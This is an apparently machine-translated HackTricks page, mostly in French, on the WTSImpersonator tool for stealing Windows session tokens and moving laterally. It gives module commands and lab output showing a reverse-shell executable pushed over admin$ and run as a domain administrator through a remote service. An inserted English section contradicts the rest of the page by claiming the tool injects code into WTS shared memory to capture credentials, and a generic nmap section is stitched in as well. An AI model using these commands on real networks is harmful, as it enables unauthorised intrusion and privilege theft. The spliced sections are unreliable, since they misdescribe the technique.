<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

WTS Impersonator abuse du pipe nommé RPC "**\\pipe\LSM_API_service**" pour énumérer les utilisateurs connectés et voler les jetons d'autres utilisateurs sans utiliser la technique normale d'**"Impersonation de jeton"**, cela permet une progression latérale facile et discrète. Cette technique a été étudiée et développée par [Omri Baso](https://www.linkedin.com/in/omri-baso/).

L'outil `WTSImpersonator` peut être trouvé sur [github](https://github.com/OmriBaso/WTSImpersonator).
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### Module `enum`:

Énumérer les utilisateurs locaux sur la machine à partir de laquelle l'outil est exécuté.
```powershell
.\WTSImpersonator.exe -m enum
```
# Enumérer une machine à distance en utilisant une adresse IP ou un nom d'hôte.

Lors de l'énumération d'une machine à distance, vous pouvez utiliser l'adresse IP ou le nom d'hôte pour accéder à la machine cible. Voici les étapes à suivre :

1. **Identifier l'adresse IP ou le nom d'hôte** de la machine cible que vous souhaitez énumérer.

2. **Ouvrir un terminal** ou une invite de commande sur votre propre machine.

3. Utilisez une **commande de balayage réseau** pour rechercher les ports ouverts sur la machine cible. Par exemple, vous pouvez utiliser la commande `nmap` avec l'option `-p-` pour balayer tous les ports. Exemple : `nmap -p- <adresse IP>`.

4. Analysez les résultats du balayage pour **identifier les services et les ports ouverts** sur la machine cible. Cela peut vous donner des informations sur les services en cours d'exécution et les vulnérabilités potentielles.

5. **Effectuez une recherche d'informations** sur les services et les ports ouverts pour obtenir plus de détails sur les vulnérabilités connues et les exploits possibles.

6. Utilisez des **outils d'exploitation** appropriés pour tester les vulnérabilités identifiées et obtenir un accès plus approfondi à la machine cible.

Il est important de noter que l'énumération d'une machine à distance sans autorisation appropriée est illégale et peut entraîner des conséquences juridiques graves. Assurez-vous d'obtenir une autorisation légale avant de procéder à toute énumération ou test de pénétration.
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### Module `exec` / `exec-remote`:
Les modules "exec" et "exec-remote" nécessitent tous deux d'être dans un contexte de **"Service"**.
Le module local "exec" n'a besoin que de WTSImpersonator.exe et du binaire que vous souhaitez exécuter (option -c). Cela pourrait être
un "C:\\Windows\\System32\\cmd.exe" normal et vous ouvrirez un CMD en tant qu'utilisateur souhaité, un exemple serait
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
Vous pouvez utiliser PsExec64.exe pour obtenir un contexte de service.
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
Pour `exec-remote`, les choses sont un peu différentes. J'ai créé un service qui peut être installé à distance, tout comme `PsExec.exe`. Le service recevra un `SessionId` et un `binaire à exécuter` en tant qu'arguments, et il sera installé et exécuté à distance en fonction des autorisations appropriées. Un exemple d'exécution ressemblerait à ceci :
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
comme on peut le voir ci-dessus, l'`ID de session` du compte Administrateur est `2`, nous l'utilisons donc ensuite dans la variable `id` lors de l'exécution du code à distance.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### Module `user-hunter`:

Le module de chasseur d'utilisateurs vous permettra d'énumérer plusieurs machines et, si un utilisateur donné est trouvé, il exécutera du code au nom de cet utilisateur.
Cela est utile lorsque vous recherchez des "Domain Admins" tout en ayant des droits d'administrateur local sur quelques machines.
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
# WTS Impersonator

The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session.

## Description

When a user logs into a Windows Terminal Server, a session is created for that user. This session is managed by the Windows Terminal Services (WTS) service. The WTS Impersonator technique takes advantage of the fact that the WTS service uses a shared memory section to store session information, including user credentials.

By injecting malicious code into the WTS shared memory section, an attacker can intercept and steal user credentials as they are being processed by the WTS service. This allows the attacker to gain unauthorized access to the user's account and potentially escalate their privileges.

## Steps

1. Identify the target Windows Terminal Server and the user whose credentials you want to steal.

2. Use a tool like `wtsimpersonator.exe` to inject malicious code into the WTS shared memory section.

3. The malicious code should be designed to intercept and capture user credentials as they are being processed by the WTS service.

4. Once the user credentials have been captured, they can be exfiltrated to the attacker's remote server or stored locally for later use.

## Mitigation

To mitigate the risk of WTS Impersonator attacks, consider the following measures:

- Regularly update and patch the Windows Terminal Server to ensure that known vulnerabilities are addressed.

- Implement strong access controls and authentication mechanisms to prevent unauthorized access to the WTS service.

- Monitor the WTS service for any suspicious activity or unauthorized access attempts.

- Educate users about the risks of phishing attacks and the importance of not sharing their credentials with anyone.

By implementing these measures, you can significantly reduce the risk of WTS Impersonator attacks and protect user credentials from being stolen.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

